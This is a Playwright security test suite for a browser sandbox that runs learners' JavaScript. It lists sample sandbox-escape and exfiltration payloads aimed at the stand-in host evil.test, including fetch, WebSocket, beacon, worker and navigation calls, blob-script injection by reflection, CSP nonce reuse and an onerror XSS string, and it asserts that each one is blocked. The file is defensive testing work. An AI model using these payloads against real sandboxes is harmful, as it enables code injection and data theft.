import { expect, test, type Page } from '@playwright/test';
import type { JavaScriptRunnerAdapter as JavaScriptRunnerAdapterType } from '../../src/adapters/runtime/javascript';
import type {
  RunnerConsoleRecord,
  RunnerDiagnostic,
  RunnerEvidence,
} from '../../src/core/runtime/contracts';
import {
  JAVASCRIPT_CH06_MODULE_EXERCISE,
  JAVASCRIPT_SOLUTION_SOURCE,
  openEditableJavaScriptExercise,
} from './helpers/javascriptCourse';
import {
  observeStableTopUrl,
  observeRuntimePage,
  readRuntimeErrors,
  takeConsoleErrors,
} from './helpers/openRuntimeFixture';
import { editorText, replaceEditorText, waitForStoredDraftContent } from './helpers/progress';
import { loadJavaScriptRunnerModulePath } from './helpers/javascriptRunnerModule';

const capabilityPayloads = [
  ['fetch', "fetch('https://evil.test/fetch');"],
  ['XMLHttpRequest', "new XMLHttpRequest().open('GET', 'https://evil.test/xhr');"],
  ['WebSocket', "new WebSocket('wss://evil.test/socket');"],
  ['Beacon', "navigator.sendBeacon('https://evil.test/beacon', 'x');"],
  ['image', "new Image().src = 'https://evil.test/image.png';"],
  [
    'form insertion',
    `document.querySelector('body').innerHTML = '<form action="https://evil.test/form"></form>';`,
  ],
  ['popup', "open('https://evil.test/popup');"],
  ['top/parent', "self.parent.postMessage('forged', '*');"],
  ['Storage', "localStorage.setItem('tsumucode-security-canary', 'pwned');"],
  ['Worker', "new Worker('https://evil.test/worker.js');"],
  ['Service Worker', "navigator.serviceWorker.register('https://evil.test/sw.js');"],
  ['eval', "eval('console.log(1)');"],
  ['Function constructor', "Function('return 1')();"],
  ['dynamic import', "import('https://evil.test/module.js');"],
  [
    'Blob script injection',
    `const name = 'src';
const script = document.createElement('script');
script.setAttribute(name, URL.createObjectURL(new Blob(["console.log('blob-injected')"])));
document.querySelector('head').appendChild(script);`,
  ],
  ['self navigation', "window.location = 'https://evil.test/navigation';"],
] as const;

type JavaScriptHarnessInput =
  | {
      readonly source: string;
      readonly capabilityProfile: 'core' | 'modules' | 'dom' | 'async' | 'project';
      readonly sourceType?: 'script';
      readonly snapshotSelector?: string;
      readonly waitBeforeSnapshotMs?: number;
    }
  | {
      readonly files: Readonly<Record<string, string>>;
      readonly entryFile: string;
      readonly capabilityProfile: 'modules';
      readonly sourceType: 'module';
      readonly snapshotSelector?: string;
      readonly waitBeforeSnapshotMs?: number;
    };

interface JavaScriptHarnessResult {
  readonly diagnostics: readonly RunnerDiagnostic[];
  readonly console: readonly RunnerConsoleRecord[];
  readonly evidence: readonly RunnerEvidence[];
  readonly rejection: string | null;
  readonly snapshotText: string | null;
}

interface InteractionSecurityEvidence {
  readonly validRequestId: string;
  readonly rejections: Readonly<Record<string, string>>;
}

/** 実Analyzerとopaque iframe Runnerへ任意ProfileのSourceを渡し、公開結果だけを返す。 */
async function runJavaScriptHarness(
  page: Page,
  input: JavaScriptHarnessInput,
): Promise<JavaScriptHarnessResult> {
  const runnerModulePath = await loadJavaScriptRunnerModulePath();
  return page.evaluate<
    JavaScriptHarnessResult,
    { readonly input: JavaScriptHarnessInput; readonly runnerModulePath: string }
  >(
    async ({ input: harnessInput, runnerModulePath }) => {
      const { JavaScriptRunnerAdapter } = (await import(/* @vite-ignore */ runnerModulePath)) as {
        readonly JavaScriptRunnerAdapter: typeof JavaScriptRunnerAdapterType;
      };
      const harnessWindow = window as typeof window & {
        __tsumucodeJavaScriptSecurityHarness?: {
          readonly runner: InstanceType<typeof JavaScriptRunnerAdapter>;
          readonly frame: HTMLIFrameElement;
        };
      };
      if (harnessWindow.__tsumucodeJavaScriptSecurityHarness === undefined) {
        const runner = new JavaScriptRunnerAdapter();
        const frame = document.createElement('iframe');
        frame.style.position = 'fixed';
        frame.style.inset = '0';
        frame.style.opacity = '0';
        frame.style.pointerEvents = 'none';
        document.body.append(frame);
        await runner.prepare(frame);
        harnessWindow.__tsumucodeJavaScriptSecurityHarness = { runner, frame };
      }
      const { runner } = harnessWindow.__tsumucodeJavaScriptSecurityHarness;
      const moduleMode = harnessInput.sourceType === 'module';
      try {
        const exerciseSessionId = crypto.randomUUID();
        const executionRevision = 1;
        const result = await runner.render({
          exerciseSessionId,
          executionRevision,
          languageId: 'javascript',
          files: {
            'index.html':
              '<!doctype html><html lang="ja"><body><h1 id="message">安全</h1></body></html>',
            'styles.css': '',
            ...(moduleMode ? harnessInput.files : { 'script.js': harnessInput.source }),
          },
          assets: [],
          viewport: { id: 'desktop', width: 1280, height: 720 },
          options: {
            runtime: {
              kind: 'javascript',
              entryFile: moduleMode ? harnessInput.entryFile : 'script.js',
              sourceType: moduleMode ? 'module' : 'script',
              capabilityProfile: harnessInput.capabilityProfile,
              primaryOutput: 'console',
            },
          },
        });
        let snapshotText: string | null = null;
        if (!moduleMode && harnessInput.snapshotSelector !== undefined) {
          await new Promise((resolve) =>
            window.setTimeout(resolve, harnessInput.waitBeforeSnapshotMs ?? 0),
          );
          const snapshot = await runner.requestSnapshot({
            exerciseSessionId,
            executionRevision,
            requestId: crypto.randomUUID(),
            policy: {
              selectors: [harnessInput.snapshotSelector],
              attributes: [],
              computedStyles: [],
              focusVisibleSelectors: [],
              focusVisibleComputedStyles: [],
              includeAllElements: false,
            },
          });
          snapshotText =
            snapshot.nodes.find(({ matchedSelectors }) =>
              matchedSelectors.includes(harnessInput.snapshotSelector ?? ''),
            )?.text ?? null;
        }
        return {
          diagnostics: result.diagnostics,
          console: result.console,
          evidence: result.evidence,
          rejection: null,
          snapshotText,
        };
      } catch (error: unknown) {
        return {
          diagnostics: [],
          console: [],
          evidence: [],
          rejection: error instanceof Error ? error.message : String(error),
          snapshotText: null,
        };
      }
    },
    {
      input,
      runnerModulePath,
    },
  );
}

/** Security E2Eで共有したRunner、Worker、iframeをtestごとに解放する。 */
async function disposeJavaScriptHarness(page: Page): Promise<void> {
  await page.evaluate(async () => {
    const harnessWindow = window as typeof window & {
      __tsumucodeJavaScriptSecurityHarness?: {
        readonly runner: { dispose(): Promise<void> };
        readonly frame: HTMLIFrameElement;
      };
    };
    const harness = harnessWindow.__tsumucodeJavaScriptSecurityHarness;
    if (harness === undefined) return;
    delete harnessWindow.__tsumucodeJavaScriptSecurityHarness;
    await harness.runner.dispose();
    harness.frame.remove();
  });
}

/** 選択中Fileを書き換え、同じ内容がIndexedDBへ保存されるまで待つ。 */
async function replaceAndSave(page: Page, source: string): Promise<void> {
  await replaceEditorText(page, source);
  await waitForStoredDraftContent(page, source);
}

test.beforeEach(async ({ page }) => {
  await observeRuntimePage(page);
  await openEditableJavaScriptExercise(page);
});

test.afterEach(async ({ page }) => {
  await disposeJavaScriptHarness(page);
  await expect(readRuntimeErrors(page)).resolves.toEqual({
    pageErrors: [],
    unhandledRejections: [],
    consoleErrors: [],
  });
});

test('bounded Consoleが循環・深さ・collection・getter・Proxy・HTML文字列をplain textへ閉じ込める', async ({
  page,
}) => {
  const result = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: `const cyclic = {};
cyclic.self = cyclic;
const deep = { a: { b: { c: { d: 'too deep' } } } };
const collection = Array.from({ length: 51 }, (_, index) => index);
const throwingGetter = { get value() { throw 'getter-called'; } };
const proxy = Proxy.revocable({}, { ownKeys() { throw 'proxy-called'; } }).proxy;
console.log(cyclic);
console.log(deep);
console.log(collection);
console.log(throwingGetter);
console.log(proxy);
console.log('<img src=x onerror="document.body.dataset.pwned=1">');`,
  });

  expect(result.diagnostics).toEqual([]);
  expect(result.console).toHaveLength(6);
  expect(result.console[0]?.text).toContain('[Circular]');
  expect(result.console[1]?.text).toContain('…');
  expect(result.console[2]?.text).toContain('…');
  expect(result.console[3]?.text).toContain('[Unreadable]');
  expect(result.console[4]?.text).toContain('[Unreadable]');
  expect(result.console[5]?.text).toContain('<img src=x onerror=');
  await expect(page.locator('img[src="x"]')).toHaveCount(0);
  expect(await page.evaluate(() => document.body.dataset['pwned'] ?? null)).toBeNull();
});

test('static Module graphをopaque Previewで実行し、依存Sourceとgraph証跡を結び付ける', async ({
  page,
}) => {
  const result = await runJavaScriptHarness(page, {
    sourceType: 'module',
    capabilityProfile: 'modules',
    entryFile: 'src/main.js',
    files: {
      'src/main.js': "import { updateMessage } from './message.js'; updateMessage();",
      'src/message.js': `export function updateMessage() {
  document.querySelector('#message').textContent = 'Moduleで更新しました';
  console.log('module-ok');
}`,
    },
  });

  expect(result.diagnostics).toEqual([]);
  expect(result.console.map(({ text }) => text)).toEqual(['module-ok']);
  expect(result.evidence).toContainEqual({ id: 'javascript.executed', value: true });
  const graphEvidence = result.evidence.find(({ id }) => id === 'javascript.module-graph-sha256');
  expect(graphEvidence?.value).toEqual(expect.stringMatching(/^[a-f0-9]{64}$/u));
});

test('不正なModule graphをfail-closedで拒否し、未解析コードを実行しない', async ({ page }) => {
  const cases = [
    {
      name: 'bare import',
      entryFile: 'src/main.js',
      files: { 'src/main.js': "import 'left-pad';" },
    },
    {
      name: 'unknown module',
      entryFile: 'src/main.js',
      files: { 'src/main.js': "import './missing.js';" },
    },
    {
      name: 'path escape',
      entryFile: 'src/main.js',
      files: { 'src/main.js': "import '../../outside.js';" },
    },
    {
      name: 'cycle',
      entryFile: 'src/main.js',
      files: {
        'src/main.js': "import './cycle.js';",
        'src/cycle.js': "import './main.js';",
      },
    },
    {
      name: 'dynamic import',
      entryFile: 'src/main.js',
      files: { 'src/main.js': "import('./other.js');" },
    },
  ] as const;

  for (const item of cases) {
    await test.step(item.name, async () => {
      const result = await runJavaScriptHarness(page, {
        sourceType: 'module',
        capabilityProfile: 'modules',
        entryFile: item.entryFile,
        files: item.files,
      });
      expect(result.console).toEqual([]);
      expect(result.rejection).toBeNull();
      expect(result.diagnostics).toEqual([
        expect.objectContaining({ kind: 'security', severity: 'error' }),
      ]);
      expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
    });
  }

  const controlCharacterPath = await runJavaScriptHarness(page, {
    sourceType: 'module',
    capabilityProfile: 'modules',
    entryFile: 'src/main.js',
    files: {
      'src/main.js': 'import \'./evil.js\\nconsole.log(\\"injected\\")//.js\';',
      'src/evil.js\nconsole.log("injected")//.js': 'export const value = 1;',
    },
  });
  expect(controlCharacterPath).toMatchObject({
    diagnostics: [],
    console: [],
    evidence: [],
    rejection: expect.stringMatching(/Preview file path must be safe/u),
  });
});

test('Chapter 06のModule Exerciseでもbare importを拒否し、診断元のmain.jsを保持する', async ({
  page,
}) => {
  await openEditableJavaScriptExercise(page, JAVASCRIPT_CH06_MODULE_EXERCISE);
  const mainTab = page.getByRole('tab', { name: 'main.js', exact: true });
  await mainTab.click();
  const forbiddenSource = "import 'left-pad';\n";
  await replaceAndSave(page, forbiddenSource);

  await page.getByRole('button', { name: '判定する' }).click();
  const feedback = page.getByRole('dialog', { name: '判定結果' });
  await expect(feedback.getByRole('heading', { name: 'コードを確認しよう' })).toBeVisible();
  await expect(feedback.getByRole('list', { name: '確認するコード診断' })).toContainText('main.js');
  await feedback.getByRole('button', { name: 'コードを直す' }).click();
  await expect(mainTab).toHaveAttribute('aria-selected', 'true');
  await expect.poll(() => editorText(page)).toBe(forbiddenSource);
});

test('Console floodと64KiB超をboundedに切り、runtime error前の記録を残して再試行できる', async ({
  page,
}) => {
  const flood = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: 'for (let index = 0; index < 101; index += 1) console.log(index);',
  });
  expect(flood.diagnostics).toEqual([]);
  expect(flood.console).toHaveLength(100);
  expect(flood.console.at(-1)).toMatchObject({
    level: 'warn',
    text: 'Console output limit reached',
  });

  const totalLimit = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: "for (let index = 0; index < 30; index += 1) console.log('😀'.repeat(1024));",
  });
  expect(totalLimit.diagnostics).toEqual([]);
  expect(
    totalLimit.console.reduce((bytes, record) => bytes + Buffer.byteLength(record.text), 0),
  ).toBeLessThanOrEqual(64 * 1024);
  expect(totalLimit.console.length).toBeLessThan(30);
  expect(totalLimit.console.at(-1)).toMatchObject({
    level: 'warn',
    text: 'Console output limit reached',
  });

  const runtimeError = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: "console.log('before-error'); throw 'boom';",
  });
  expect(runtimeError.console.map(({ text }) => text)).toEqual(['before-error']);
  expect(runtimeError.diagnostics).toEqual([
    expect.objectContaining({ code: 'javascript-runtime', severity: 'error' }),
  ]);

  const retried = await runJavaScriptHarness(page, {
    capabilityProfile: 'project',
    source: "console.log('retry-ok');",
  });
  expect(retried.diagnostics).toEqual([]);
  expect(retried.console.map(({ text }) => text)).toEqual(['retry-ok']);
});

test('coreとprojectの両Profileで危険Capabilityをcode-errorとして拒否する', async ({ page }) => {
  for (const capabilityProfile of ['core', 'project'] as const) {
    for (const [name, source] of capabilityPayloads) {
      await test.step(`${capabilityProfile}: ${name}`, async () => {
        const result = await runJavaScriptHarness(page, { capabilityProfile, source });
        expect(result.console, `${capabilityProfile}/${name}`).toEqual([]);
        expect(result.diagnostics, `${capabilityProfile}/${name}`).toEqual([
          expect.objectContaining({ kind: 'security', severity: 'error' }),
        ]);
        expect(
          result.diagnostics.some(({ kind }) => kind === 'system'),
          `${capabilityProfile}/${name}をsystem-errorへ変換しない`,
        ).toBe(false);
      });
    }
  }
});

test('全Profileでcomputed property runtime escapeをcode-errorとして拒否する', async ({ page }) => {
  const source = `const el = document.querySelector('#message');
const d = el['owner' + 'Document'];
const w = d['default' + 'View'];
const s = d['create' + 'Element']('script');
const blob = Reflect.construct(w['Blob'], [["console.log('blob-injected')"]]);
s['set' + 'Attribute']('s' + 'rc', w['URL']['create' + 'ObjectURL'](blob));
d['query' + 'Selector']('head')['append' + 'Child'](s);`;

  for (const capabilityProfile of ['core', 'modules', 'dom', 'async', 'project'] as const) {
    const result = await runJavaScriptHarness(page, { capabilityProfile, source });
    expect(result.rejection).toBeNull();
    expect(result.console).toEqual([]);
    expect(result.diagnostics).toEqual([
      expect.objectContaining({ kind: 'security', severity: 'error' }),
    ]);
    expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
  }
});

test('全ProfileでObject reflection runtime escapeをcode-errorとして拒否する', async ({ page }) => {
  const source = `function descriptorFor(value, name) {
  let prototype = value;
  while (prototype !== null) {
    const descriptor = Object.getOwnPropertyDescriptor(prototype, name);
    if (descriptor !== undefined) return descriptor;
    prototype = Object.getPrototypeOf(prototype);
  }
}
const element = document.querySelector('#message');
const owner = descriptorFor(element, 'ownerDocument').get.call(element);
const view = descriptorFor(owner, 'defaultView').get.call(owner);
const script = owner.createElement('script');
const blob = view.Reflect.construct(view.Blob, [["console.log('reflection-injected')"]]);
descriptorFor(script, 'setAttribute').value.call(script, 'src', view.URL.createObjectURL(blob));
descriptorFor(owner.querySelector('head'), 'appendChild').value.call(
  owner.querySelector('head'),
  script,
);`;

  for (const capabilityProfile of ['core', 'modules', 'dom', 'async', 'project'] as const) {
    const result = await runJavaScriptHarness(page, { capabilityProfile, source });
    expect(result.rejection).toBeNull();
    expect(result.console).toEqual([]);
    expect(result.diagnostics).toEqual([
      expect.objectContaining({ kind: 'security', severity: 'error' }),
    ]);
    expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
  }
});

test('DOM許可ProfileでもCSP nonce再利用によるinline script注入をcode-errorとして拒否する', async ({
  page,
}) => {
  const source = `const nonce=document.querySelector('script').nonce;
const script=document.createElement('script');
script.nonce=nonce;
script.text="document.body.dataset.injected='yes'";
document.querySelector('head').appendChild(script);`;

  for (const capabilityProfile of ['dom', 'async', 'project'] as const) {
    const result = await runJavaScriptHarness(page, { capabilityProfile, source });
    expect(result.rejection).toBeNull();
    expect(result.console).toEqual([]);
    expect(result.diagnostics).toEqual([
      expect.objectContaining({ kind: 'security', severity: 'error' }),
    ]);
    expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
  }
});

test('学習コード開始時にはCSP metaとbootstrap scriptがDOMへ残らない', async ({ page }) => {
  const result = await runJavaScriptHarness(page, {
    capabilityProfile: 'dom',
    source: `console.log(
  document.querySelector('meta[http-equiv="Content-Security-Policy"]') === null,
  document.querySelector('script') === null,
);`,
  });

  expect(result.rejection).toBeNull();
  expect(result.diagnostics).toEqual([]);
  expect(result.console).toEqual([expect.objectContaining({ level: 'log', text: 'true true' })]);
});

test('CSP meta除去後も適用済みPolicyはnonceなしinline scriptを拒否する', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const token = crypto.randomUUID();
    return await new Promise<boolean>((resolve, reject) => {
      const timeout = window.setTimeout(() => {
        reject(new Error('CSP probe timed out'));
      }, 2_000);
      const onMessage = (event: MessageEvent<unknown>) => {
        if (typeof event.data !== 'object' || event.data === null) return;
        const data = event.data as Readonly<Record<string, unknown>>;
        if (data['token'] !== token) return;
        window.clearTimeout(timeout);
        window.removeEventListener('message', onMessage);
        resolve(data['injected'] === true);
      };
      window.addEventListener('message', onMessage);
      const frame = document.createElement('iframe');
      frame.setAttribute('sandbox', 'allow-scripts');
      frame.srcdoc = `<!doctype html><meta http-equiv="Content-Security-Policy" content="script-src 'nonce-known'; script-src-attr 'none'"><script nonce="known">const token=${JSON.stringify(token)};document.querySelector('meta').remove();const current=document.currentScript;current.nonce='';current.removeAttribute('nonce');const injected=document.createElement('script');injected.textContent="parent.postMessage({token:'${token}',injected:true},'*')";document.head.append(injected);setTimeout(()=>parent.postMessage({token, injected:false},'*'),0);</script>`;
      document.body.append(frame);
    });
  });

  expect(result).toBe(false);
  expect(takeConsoleErrors(page)).toEqual([
    expect.stringMatching(/Content Security Policy|Content-Security-Policy|Refused to execute/u),
  ]);
});

test('async timerはlockdown後も動作し、Object.keys改変後もtimer回収してSnapshotできる', async ({
  page,
}) => {
  const result = await runJavaScriptHarness(page, {
    capabilityProfile: 'async',
    source: `Object.keys = () => [];
setTimeout(() => {
  document.querySelector('#message').textContent = 'timer-ok';
}, 0);`,
    snapshotSelector: '#message',
    waitBeforeSnapshotMs: 50,
  });

  expect(result.rejection).toBeNull();
  expect(result.diagnostics).toEqual([]);
  expect(result.snapshotText).toBe('timer-ok');
});

test('legacy parentWindow経由でもasync Profile制限を迂回できない', async ({ page }) => {
  const sources = [
    "document.querySelector('body').getRootNode().parentWindow.setTimeout(() => {}, 0);",
    "document.querySelector('body').getRootNode().parentWindow.Promise.resolve(1);",
  ];
  for (const capabilityProfile of ['core', 'modules', 'dom'] as const) {
    for (const source of sources) {
      const result = await runJavaScriptHarness(page, { capabilityProfile, source });
      expect(result.rejection).toBeNull();
      expect(result.diagnostics).toEqual([
        expect.objectContaining({ kind: 'security', severity: 'error' }),
      ]);
      expect(result.diagnostics.some(({ kind }) => kind === 'system')).toBe(false);
    }
  }
});

test('待機後の実ユーザーEventでもcallback予算を更新してDOMを変更する', async ({ page }) => {
  const result = await runJavaScriptHarness(page, {
    capabilityProfile: 'dom',
    source: `document.querySelector('#message').addEventListener('click', () => {
  document.querySelector('#message').textContent = 'event-ok';
});`,
  });
  expect(result.rejection).toBeNull();
  expect(result.diagnostics).toEqual([]);

  await page.waitForTimeout(350);
  const harnessFrame = page.locator('iframe[title="JavaScriptコードのプレビュー"]').last();
  await harnessFrame.evaluate((frame) => {
    frame.style.pointerEvents = 'auto';
    frame.style.opacity = '1';
    frame.style.zIndex = '2147483647';
  });
  await harnessFrame.contentFrame().locator('#message').click();
  await expect(harnessFrame.contentFrame().locator('#message')).toHaveText('event-ok');
});

test('同期Event dispatchとlistener自己再帰ではbudgetをresetせず安全に停止する', async ({
  page,
}) => {
  const sources = [
    `const element = document.querySelector('#message');
element.addEventListener('click', () => {});
while (true) element.click();`,
    `const element = document.querySelector('#message');
const recurse = () => {
  const next = document.createElement('button');
  next.addEventListener('click', recurse);
  next.click();
};
element.addEventListener('click', recurse);
element.click();`,
  ];
  for (const source of sources) {
    const result = await runJavaScriptHarness(page, { capabilityProfile: 'dom', source });
    expect(result.rejection).toBeNull();
    expect(result.diagnostics, `${source}\n${JSON.stringify(result.evidence)}`).toContainEqual(
      expect.objectContaining({ kind: 'system', code: 'javascript-budget' }),
    );
  }
});

test('ConsoleのHTML風文字列をElement化せず、親DOMと外部通信を変更しない', async ({ page }) => {
  const externalRequests: string[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  await page.evaluate(() => {
    delete document.body.dataset['consolePwned'];
  });
  const source = `console.log('<img src="https://evil.test/x" onerror="document.body.dataset.consolePwned=1">');
document.querySelector('#message').textContent = 'JavaScriptで文字を変えました';`;
  await replaceAndSave(page, source);
  const update = page.getByRole('button', { name: 'プレビューを更新' });
  await update.click();
  await expect(update).toBeEnabled();
  await page.getByRole('tab', { name: 'Console' }).click();
  const consoleRegion = page.getByRole('region', { name: 'Console出力' });
  await expect(consoleRegion).toContainText('<img src="https://evil.test/x"');
  await expect(consoleRegion.locator('img')).toHaveCount(0);
  expect(await page.evaluate(() => document.body.dataset['consolePwned'] ?? null)).toBeNull();
  expect(externalRequests).toEqual([]);
});

test('Interactionは別frame・stale・replay・oversize要求を実ブラウザで拒否する', async ({
  page,
}) => {
  const runnerModulePath = await loadJavaScriptRunnerModulePath();
  const evidence = await page.evaluate<
    InteractionSecurityEvidence,
    { readonly runnerModulePath: string }
  >(
    async ({ runnerModulePath }) => {
      const { JavaScriptRunnerAdapter } = (await import(/* @vite-ignore */ runnerModulePath)) as {
        readonly JavaScriptRunnerAdapter: typeof JavaScriptRunnerAdapterType;
      };
      const runner = new JavaScriptRunnerAdapter();
      const frame = document.createElement('iframe');
      const otherFrame = document.createElement('iframe');
      frame.style.position = 'fixed';
      frame.style.inset = '0';
      frame.style.opacity = '0';
      frame.style.pointerEvents = 'none';
      otherFrame.style.display = 'none';
      document.body.append(frame, otherFrame);
      await runner.prepare(frame);
      const exerciseSessionId = crypto.randomUUID();
      let executionRevision = 1;
      const render = async () =>
        runner.render({
          exerciseSessionId,
          executionRevision,
          languageId: 'javascript',
          files: {
            'index.html': '<button id="answer" type="button">回答</button>',
            'styles.css': '',
            'script.js':
              "document.querySelector('#answer').addEventListener('click', () => console.log('answer'));",
          },
          assets: [],
          viewport: { id: 'desktop', width: 1280, height: 720 },
          options: {
            runtime: {
              kind: 'javascript',
              entryFile: 'script.js',
              sourceType: 'script',
              capabilityProfile: 'dom',
              primaryOutput: 'preview',
            },
          },
        });
      const rejection = async (operation: Promise<unknown>): Promise<string> => {
        try {
          await operation;
          return 'resolved';
        } catch (error: unknown) {
          return error instanceof Error ? error.message : String(error);
        }
      };

      try {
        const first = await render();
        if (first.frameGeneration === undefined) throw new Error('frame generationがありません');
        const requestId = 'interaction-security-valid';
        const valid = runner.interact({
          exerciseSessionId,
          executionRevision,
          frameGeneration: first.frameGeneration,
          requestId,
          action: { id: 'answer', kind: 'click', selector: '#answer' },
        });
        const forgedEnvelope = {
          version: 1,
          type: 'javascript.interaction-complete',
          exerciseSessionId,
          executionRevision,
          frameGeneration: first.frameGeneration,
          requestId,
          oneTimeToken: 'forged-token',
          payload: { error: null, console: [] },
        };
        window.dispatchEvent(
          new MessageEvent('message', { source: otherFrame.contentWindow, data: forgedEnvelope }),
        );
        window.dispatchEvent(
          new MessageEvent('message', {
            source: window,
            data: { ...forgedEnvelope, executionRevision: executionRevision + 1 },
          }),
        );
        const validResult = await valid;

        const replay = await rejection(
          runner.interact({
            exerciseSessionId,
            executionRevision,
            frameGeneration: first.frameGeneration,
            requestId,
            action: { id: 'answer-again', kind: 'click', selector: '#answer' },
          }),
        );
        const oversizeSelector = await rejection(
          runner.interact({
            exerciseSessionId,
            executionRevision,
            frameGeneration: first.frameGeneration,
            requestId: 'interaction-oversize-selector',
            action: { id: 'oversize-selector', kind: 'click', selector: '#'.repeat(257) },
          }),
        );
        const oversizeValue = await rejection(
          runner.interact({
            exerciseSessionId,
            executionRevision,
            frameGeneration: first.frameGeneration,
            requestId: 'interaction-oversize-value',
            action: {
              id: 'oversize-value',
              kind: 'fill',
              selector: '#answer',
              value: 'x'.repeat(4_097),
            },
          }),
        );
        executionRevision += 1;
        const second = await render();
        if (second.frameGeneration === undefined) throw new Error('frame generationがありません');
        const stale = await rejection(
          runner.interact({
            exerciseSessionId,
            executionRevision,
            frameGeneration: first.frameGeneration,
            requestId: 'interaction-stale',
            action: { id: 'stale', kind: 'click', selector: '#answer' },
          }),
        );

        return {
          validRequestId: validResult.requestId,
          rejections: { replay, oversizeSelector, oversizeValue, stale },
        };
      } finally {
        await runner.dispose();
        frame.remove();
        otherFrame.remove();
      }
    },
    { runnerModulePath },
  );

  expect(evidence.validRequestId).toBe('interaction-security-valid');
  expect(evidence.rejections.replay).toMatch(/duplicated/u);
  expect(evidence.rejections.oversizeSelector).toMatch(/invalid/u);
  expect(evidence.rejections.oversizeValue).toMatch(/invalid/u);
  expect(evidence.rejections.stale).toMatch(/current/u);
});

test('JavaScript Capability payloadをfail-closedで拒否し、親画面と外部通信を守る', async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const popups: Page[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  page.on('popup', (popup) => {
    popups.push(popup);
  });
  const originalUrl = page.url();
  await page.evaluate(() => {
    document.body.dataset.javascriptSecurityCanary = 'intact';
    localStorage.setItem('tsumucode-security-canary', 'intact');
  });

  try {
    for (const [name, source] of capabilityPayloads) {
      await test.step(name, async () => {
        await replaceAndSave(page, source);
        const update = page.getByRole('button', { name: 'プレビューを更新' });
        await update.click();
        await expect(update).toBeEnabled();
        await expect(page.getByRole('list', { name: 'コード診断' })).toBeVisible();
        await expect.poll(() => editorText(page)).toBe(source);
        expect(await observeStableTopUrl(page, originalUrl)).toBe(true);
        expect(
          await page.evaluate(() => ({
            canary: document.body.dataset.javascriptSecurityCanary ?? null,
            storage: localStorage.getItem('tsumucode-security-canary'),
          })),
        ).toEqual({ canary: 'intact', storage: 'intact' });
        expect(externalRequests, `${name}から外部requestを発生させない`).toEqual([]);
        expect(popups, `${name}からpopupを開かない`).toEqual([]);
      });
    }

    await page.evaluate(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          source: window,
          data: {
            version: 1,
            type: 'javascript.execution-complete',
            exerciseSessionId: 'forged-session',
            executionRevision: 999,
            requestId: 'execution',
            oneTimeToken: 'stale-token',
            payload: {
              executed: true,
              budgetExhausted: false,
              timerLimitExceeded: false,
              runtimeError: null,
            },
          },
        }),
      );
    });
    expect(page.url()).toBe(originalUrl);

    await replaceAndSave(page, JAVASCRIPT_SOLUTION_SOURCE);
    await page.getByRole('button', { name: 'プレビューを更新' }).click();
    await expect(
      page
        .getByTestId('runtime-preview-frame')
        .locator('iframe')
        .contentFrame()
        .getByRole('heading', { name: 'JavaScriptで文字を変えました' }),
    ).toBeVisible();
  } finally {
    await Promise.all(popups.map((popup) => popup.close().catch(() => undefined)));
  }
});

test('HTMLの外部image・form・popup導線を除き、script.jsだけを安全な別経路で実行する', async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const popups: Page[] = [];
  page.on('request', (request) => {
    if (request.url().includes('evil.test')) externalRequests.push(request.url());
  });
  page.on('popup', (popup) => {
    popups.push(popup);
  });
  const originalUrl = page.url();
  const htmlPayload = `<!doctype html>
<html lang="ja">
  <body>
    <main><h1 id="message">安全</h1></main>
    <img src="https://evil.test/image.png" alt="外部画像">
    <form action="https://evil.test/form" method="post">
      <button formaction="https://evil.test/override">送信</button>
    </form>
    <a href="https://evil.test/popup" target="_blank">外部Link</a>
    <script src="script.js"></script>
  </body>
</html>`;

  try {
    await page.getByRole('tab', { name: 'index.html', exact: true }).click();
    await replaceAndSave(page, htmlPayload);
    await page.getByRole('button', { name: 'プレビューを更新' }).click();
    const frame = page.getByTestId('runtime-preview-frame').locator('iframe').contentFrame();
    await expect(frame.getByRole('heading', { name: 'ここを書き換えます' })).toBeVisible();
    await expect(frame.getByRole('img', { name: '外部画像' })).not.toHaveAttribute('src');
    await expect(frame.locator('form')).not.toHaveAttribute('action');
    await expect(frame.locator('form')).not.toHaveAttribute('method');
    await expect(frame.getByRole('button', { name: '送信' })).not.toHaveAttribute('formaction');
    await expect(frame.getByRole('link', { name: '外部Link' })).not.toHaveAttribute('target');
    expect(await observeStableTopUrl(page, originalUrl)).toBe(true);
    expect(externalRequests).toEqual([]);
    expect(popups).toEqual([]);
  } finally {
    await Promise.all(popups.map((popup) => popup.close().catch(() => undefined)));
  }
});
